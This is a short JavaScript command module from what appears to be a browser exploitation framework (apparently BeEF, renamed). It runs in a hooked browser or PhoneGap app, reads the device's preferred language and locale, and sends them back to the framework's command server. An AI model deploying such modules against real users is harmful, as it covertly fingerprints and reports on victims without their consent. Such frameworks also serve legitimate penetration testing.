//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

// Phonegap_globalization_status
//
server.execute(function() {
    var result = '';

    navigator.globalization.getPreferredLanguage(
  		function (language) {
  			result = 'language: ' + language.value + '\n';
        server.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		}, 
  		function () {
  			result = 'language: ' + 'fail\n';
        server.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		}
	);

    navigator.globalization.getLocaleName(
  		function (locale) {
  			result = 'locale: ' + locale.value + '\n';
        server.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		},
  		function () {
  			result = 'locale: ' + 'fail\n';
        server.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		}
	);
    
});